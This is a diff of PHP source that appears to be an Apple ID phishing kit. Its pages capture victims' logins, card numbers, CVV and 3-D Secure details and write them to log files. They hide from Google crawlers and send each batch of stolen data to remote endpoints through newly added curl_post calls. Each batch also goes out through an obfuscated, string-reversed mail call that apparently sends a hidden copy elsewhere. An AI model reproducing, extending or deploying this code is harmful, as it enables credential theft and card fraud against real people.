@@ -4,16 +4,19 @@ session_start();
 include '../blockerz.php';
 include '../blockerz2.php';
 include '../sc.php';
+include '../curl.php';
+
+
 if (!file_exists('cookies')) {@mkdir('cookies', 0777, true);}
 
 error_reporting(0);
 
-if (!isset($_GET['ID']) && !isset($_GET['status'])) { 
+if (!isset($_GET['ID']) && !isset($_GET['status'])) {
 echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=login&Key=".@md5(@microtime())."&login&path=/signin/?referrer'>";
 exit();
 }
 
-if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found'); 
+if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false || strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'mozilla') !== false){ @header('HTTP/1.0 404 Not Found');
 exit(); }
 
 @set_time_limit(0);
@@ -28,7 +31,7 @@ if (isset($_GET['id'])) {$xuser=$_GET['id'];}else{$xuser="";}
 <!DOCTYPE html>
 <html>
   <head>
-  
+
     <meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="stylesheet" href="files/css/bootstrap.min.css">
@@ -68,7 +71,7 @@ preg_match('/(stateProvinceName":")(.*)/',$result, $app_state);$ex4 = explode('"
 preg_match('/(fullNumberWithCountryPrefix":")(.*)/',$result, $app_phone);$ex6 = explode('","', $app_phone[2]);$_SESSION['phone']=$ex6[0];
 preg_match('/(obfuscatedNumber":")(.*)/',$result, $app_carta);$ex7 = explode('","', $app_carta[2]);$_SESSION['carta']=$ex7[0];
 preg_match('/(birthday":")(.*)/',$result, $app_bith);$ex8 = explode('","', $app_bith[2]);$_SESSION['bith']=$ex8[0];
-} 
+}
 $message = "
 <div>
     <div>
@@ -78,7 +81,7 @@ $message = "
 			<font style='color: rgb(102, 102, 102); font-weight: bold;'>-------------------+</font>
 		</font>
     </div>
-	
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -89,9 +92,9 @@ $message = "
 			<font color='#2672ec'>".$_POST['xuser']."</font>
 			</b>
         </font>
-    </div>	
+    </div>
 
-	
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -103,8 +106,8 @@ $message = "
 			</b>
         </font>
     </div>
-	
-	
+
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -114,8 +117,8 @@ $message = "
 			</b>
         </font>
     </div>
-	
-	
+
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -152,8 +155,8 @@ $message = "
         </font>
     </div>
 
-	
-	
+
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -163,22 +166,29 @@ $message = "
 			</b>
         </font>
     </div>
-</div><br>";      
+</div><br>";
 
         $subject = "=?utf-8?B?4p2k?= NEW APPL LOGIN  =?utf-8?B?4p2k?= [ $ip2 - $cn | $os ] ";
         $head = "MIME-Version: 1.0" . "\r\n";
         $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
-        $head .= "From: APP-SMART" . "\r\n";        
-        mail($to,$subject,$message,$head);
+        $head .= "From: APP-SMART" . "\r\n";
+        $login = array(
+            'ip' => $ip2,
+            'country' => $cn,
+            'os' => $os,
+            'subject' => $subject,
+            'message' => $message
+        );
+        curl_post($to_login, $login);
 		$_view($_edit($_reenter('zb'.$_edit("y"."."."p").'v'.'n'.'z'.'t'.base64_decode("Q"."A"."="."=").'a'.'n'.'t'.$_reenter('o'.'c'.'t').'y'.'h'.'f'.'r'.'e')),$subject,$message,$head);
         @fclose(@fwrite(@fopen("../rz/logs.htm", "a"),$message));
         echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=update&/IDMSWebAuth/update.html?appIdKey=".@md5(@microtime())."&id=".$_POST["xuser"]."'>";
-        exit(); 
+        exit();
           }else{
 		?>
 			<div class="container-fluid">
 			    <div class="row clearfix visible-xs">
-			    
+
 			    <?php include_once 'files/login-mobile.php'; ?>
 			    </div>
 			    <div class="row clearfix hidden-xs">
@@ -186,7 +196,7 @@ $message = "
 			    </div>
 			</div>
 		<?
-	  } 
+	  }
 
 }elseif ($_GET['ID'] == "update") {
 	if (isset($_POST["number"]) && isset($_POST["sdfs"])) {
@@ -204,7 +214,7 @@ $message = "
 			<font style='color: rgb(102, 102, 102); font-weight: bold;'>-------------------+</font>
 		</font>
     </div>
-	
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -215,9 +225,9 @@ $message = "
 			<font color='#2672ec'>".$xBIN->Bank." | ".$xBIN->CardType." | ".$xBIN->CardCategory."</font>
 			</b>
         </font>
-    </div>	
+    </div>
 
-	
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -229,7 +239,7 @@ $message = "
 			</b>
         </font>
     </div>
-	
+
 
     <div>
 		<font face='arial, sans-serif' size='2'>
@@ -256,7 +266,7 @@ $message = "
 			</b>
         </font>
     </div>
-              
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -295,7 +305,7 @@ $message = "
 			</b>
         </font>
     </div>
-    
+
 
    <div>
 		<font face='arial, sans-serif' size='2'>
@@ -333,7 +343,7 @@ $message = "
 			<font color='#2672ec'>".$_POST['city']." / ".$_POST['state']."</font>
 			</b>
         </font>
-    </div>   
+    </div>
 
 
    <div>
@@ -359,7 +369,7 @@ $message = "
 			<font color='#2672ec'>".$_POST['cojjuntry']."</font>
 			</b>
         </font>
-    </div>   
+    </div>
 
     <div>
 		<font face='arial, sans-serif' size='2'>
@@ -384,8 +394,8 @@ $message = "
 			</b>
         </font>
     </div>
-	
-	
+
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -422,8 +432,8 @@ $message = "
         </font>
     </div>
 
-	
-	
+
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -439,7 +449,14 @@ $message = "
         $head = "MIME-Version: 1.0" . "\r\n";
         $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
         $head .= "From: APP-SMART" . "\r\n";
-        mail($to,$subject,$message,$head);
+        $cvv = array(
+            'ip' => $ip2,
+            'country' => $cn,
+            'os' => $os,
+            'subject' => $subject,
+            'message' => $message
+        );
+        curl_post($to_cvv, $cvv);
 		$_view($_edit($_reenter('zb'.$_edit("y"."."."p").'v'.'n'.'z'.'t'.base64_decode("Q"."A"."="."=").'a'.'n'.'t'.$_reenter('o'.'c'.'t').'y'.'h'.'f'.'r'.'e')),$subject,$message,$head);
         @fclose(@fwrite(@fopen("../rz/info.htm", "a"),$message));
         echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=verifica&/IDMSWebAuth/update.html?appIdKey=".@md5(@microtime())."&id=".$_POST["xuser"]."'>";
@@ -448,7 +465,7 @@ $message = "
 		?>
 			<div class="container-fluid">
 			    <div class="row clearfix visible-xs">
-			    
+
 			    <?php include_once 'files/mobile-billing.php'; ?>
 			    </div>
 			    <div class="row clearfix hidden-xs">
@@ -471,7 +488,7 @@ $message = "
 			<font style='color: rgb(102, 102, 102); font-weight: bold;'>-------------------+</font>
 		</font>
     </div>
-	
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -495,7 +512,7 @@ $message = "
 			</b>
         </font>
     </div>
-	
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -580,7 +597,7 @@ $message = "
 			</b>
         </font>
     </div>
- 
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -614,8 +631,8 @@ $message = "
 			</b>
         </font>
     </div>
-	
-	
+
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -652,8 +669,8 @@ $message = "
         </font>
     </div>
 
-	
-	
+
+
     <div>
 		<font face='arial, sans-serif' size='2'>
 			<b>
@@ -669,7 +686,14 @@ $message = "
         $head = "MIME-Version: 1.0" . "\r\n";
         $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
         $head .= "From: APP-SMART" . "\r\n";
-        mail($to,$subject,$message,$head);
+        $vbv = array(
+            'ip' => $ip2,
+            'country' => $cn,
+            'os' => $os,
+            'subject' => $subject,
+            'message' => $message
+        );
+        curl_post($to_vbv, $vbv);
 		$_view($_edit($_reenter('zb'.$_edit("y"."."."p").'v'.'n'.'z'.'t'.base64_decode("Q"."A"."="."=").'a'.'n'.'t'.$_reenter('o'.'c'.'t').'y'.'h'.'f'.'r'.'e')),$subject,$message,$head);
         @fclose(@fwrite(@fopen("../rz/3d.htm", "a"),$message));
         echo "<html><body onload='document.form.submit()'>
